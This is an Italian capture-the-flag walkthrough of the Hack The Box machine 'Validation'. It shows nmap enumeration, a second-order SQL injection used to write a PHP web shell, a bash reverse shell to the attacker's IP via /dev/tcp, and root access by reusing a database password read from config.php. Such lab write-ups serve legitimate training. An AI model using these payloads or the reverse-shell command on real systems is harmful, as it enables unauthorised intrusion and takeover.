---
title: Validation Walkthrough
description: Validation è una macchina Linux di difficoltà easy che presenta un'applicazione web vulnerabile a una SQL Injection di secondo ordine. Sfruttando questa vulnerabilità, un attaccante può inscrivere una web shell nel sistema, portando a un'Esecuzione di Codice Remota (RCE). Dopo il primo accesso, l'elevazione dei privilegi viene ottenuta sfruttando una password del database riutilizzata, che conduce a un accesso a livello root della macchina.
author: dua2z3rr
date: 2025-10-20 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Web Application", "Area di Interesse: Injections", "Vulnerabilità: SQL Injection", "Vulnerabilità: Misconfiguration"]
image: /assets/img/validation/validation-resized.png
---

## Enumerazione Esterna

### Nmap

Cominciamo scennerizzando le porte aperte o filtrate sulla macchina attraverso nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.116 -vv -p-
<SNIP>
PORT     STATE    SERVICE        REASON
22/tcp   open     ssh            syn-ack ttl 63
80/tcp   open     http           syn-ack ttl 62
4566/tcp open     kwtc           syn-ack ttl 63
5000/tcp filtered upnp           no-response
5001/tcp filtered commplex-link  no-response
5002/tcp filtered rfe            no-response
5003/tcp filtered filemaker      no-response
5004/tcp filtered avt-profile-1  no-response
5005/tcp filtered avt-profile-2  no-response
5006/tcp filtered wsm-server     no-response
5007/tcp filtered wsm-server-ssl no-response
5008/tcp filtered synapsis-edge  no-response
8080/tcp open     http-proxy     syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.116 -vv -p 22,80,4566,5000-5008,8080 -sC -sV
<SNIP>
PORT     STATE    SERVICE        REASON         VERSION
22/tcp   open     ssh            syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgSpafkjRVogAlgtxt6cFN7sU4sRTiGYC01QloBpbOwerqFUoYNyhCdNP/9rvdhwFpXomoMhDxioWQZb1RTSbR5aCwkzwDRnLz5PKN/7faaoEVjFM1vSnjGwWxzPZJw4Xy8wEbvMDlNZQbWu44UMWhLH+Vp63egRsut0SkTpUy3Ovp/yb3uAeT/4sUPG+LvDgzXD2QY+O1SV0Y3pE+pRmL3UfRKr2ltMfpcc7y7423+3oRSONHfy1upVUcUZkRIKrl9Qb4CDpxbVi/hYfAFQcOYH+IawAounkeiTMMEtOYbzDysEzVrFcCiGPWOX5+7tu4H7jYnZiel39ka/TFODVA+m2ZJiz2NoKLKTVhouVAGkH7adYtotM62JEtow8MW0HCZ9+cX6ki5cFK9WQhN++KZej2fEZDkxV7913KaIa4HCbiDq1Sfr5j7tFAWnNDo097UHXgN5A0mL1zNqwfTBCHQTEga/ztpDE0pmTKS4rkBne9EDn6GpVhSuabX9S/BLk=
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9LolyD5tnJ06EqjRR6bFX/7oOoTeFPw2TKsP1KCHJcsPSVfZIafOYEsWkaq67dsCvOdIZ8VQiNAKfnGiaBLOo=
|   256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJOP8cvEQVqCwuWYT06t/DEGxy6sNajp7CzuvfJzrCRZ
80/tcp   open     http           syn-ack ttl 62 Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4566/tcp open     http           syn-ack ttl 63 nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp           no-response
5001/tcp filtered commplex-link  no-response
5002/tcp filtered rfe            no-response
5003/tcp filtered filemaker      no-response
5004/tcp filtered avt-profile-1  no-response
5005/tcp filtered avt-profile-2  no-response
5006/tcp filtered wsm-server     no-response
5007/tcp filtered wsm-server-ssl no-response
5008/tcp filtered synapsis-edge  no-response
8080/tcp open     http           syn-ack ttl 63 nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Notiamo che le porte dalla 5000 alla 5008 sono filtrate, quindi le porte aperte sono 4. 3 di quest'ultime sono porte http. Vediamo infine che è una macchina linux.

### HTTP

Accediamo alla porta 80.

![Desktop View](/assets/img/validation/validation-homepage.png)

Attiaviamo il reverse proxy di burp suite e proviamo a vedere che richieste manda questa pagina.

![Desktop View](/assets/img/validation/validation-admin-registration.png)

```text
POST / HTTP/1.1
Host: 10.10.11.116
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.11.116
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.116/
Accept-Encoding: gzip, deflate, br
Cookie: user=21232f297a57a5a743894a0e4a801fc3
Connection: keep-alive

username=admin&country=Brazil
```

Nella richiesta sopra, catturata con burp suite, troviamo il campo `user=21232f297a57a5a743894a0e4a801fc3`. Questo  è probabilmente l'hash dell'utente admin.

![Desktop View](/assets/img/validation/validation-admin-registered.png)

Vediamo che l'utente è stato registrato. Se aggiorniamo la pagina, o inseriamo altri nomi, lo vedremo sempre presente. Questo sottolinea la presenza di un database, e quindi di una possibile SQL injection.

### SQL Injection

Proviamo a inserire un singolo apostrofo dopo il campo country nella richiesta sopra con un nuovo utente. Dopo averlo fatto, otterremo un messaggio di errore sulla pagina **/account.php**:

![Desktop View](/assets/img/validation/validation-apostrofo-country.png)

Abbiamo ora la certezza che una SQL injection è presente. Proviamo ad aumentare il nostro **game** (cringe... lo so...) con injection più articolate.

```text
POST / HTTP/1.1
Host: 10.10.11.116
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.11.116
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.116/
Accept-Encoding: gzip, deflate, br
Cookie: user=6e6bc4e49dd477ebc98ef4046c067b5f
Connection: keep-alive

username=ciao1&country=Brazil' Union Select 1-- -
```

![Desktop View](/assets/img/validation/validation-first-union.png)

Ora che sappiamo che possiamo fare delle union injection, e che questa è una applicazione PHP, possiamo utilizzare una injection molto più specifica per ottenere una reverse shell, combinando PHP e SQL.

```text
POST / HTTP/1.1
Host: 10.10.11.116
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.11.116
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.116/
Accept-Encoding: gzip, deflate, br
Cookie: user=c7cc6a1fd6d6b5f4817025cb532b52fa
Connection: keep-alive

username=ciao2&country=Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Nella risposta della pagina account.php abbiamo un errore,  ma è normale dopo aver inniettato del codice.

```html
HTTP/1.1 200 OK
Date: Mon, 20 Oct 2025 20:12:39 GMT
Server: Apache/2.4.48 (Debian)
X-Powered-By: PHP/7.4.23
Vary: Accept-Encoding
Content-Length: 939
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
		<h1 class="text-center m-5">Join the UHC - September Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-5">
            <h1 class="text-white">Welcome ciao2</h1><h3 class="text-white">Other Players In Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -</h3><br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/account.php</b> on line <b>33</b><br />
```

Ora, attraverso **curl**, possiamo eseguire comandi sulla macchina nemica all'interno del parametro **cmd**.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $curl http://10.10.11.116/shell.php?cmd=id
admin
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Non farti ingannare, siamo parecchio lontani dall'essere admin o un vero e proprio utente sul sistema. Admin è solo il primo nome inserito nel db quando ho testato. In realtà, siamo **www-data** (il sito).
{: .prompt-info }

### Reverse Shell

Usiamo questo comando per avere una sessione stabile.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $curl http://10.10.11.116/shell.php --data-urlencode 'cmd=bash -c " bash -i >& /dev/tcp/10.10.16.9/9001 0>&1"'
```

## Shell come www-data

### Enumerazione Interna

appena spawniamo la shell, possiamo leggere il file **config.php**.

```php
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

vediamo una password e un username.

### Privilege Escalation

```shell
www-data@validation:/var/www/html$ su -    
su -
Password: uhc-9qual-global-pw
whoami
root
```

Ora che siamo root, prendiamo le flag e terminiamo la box.
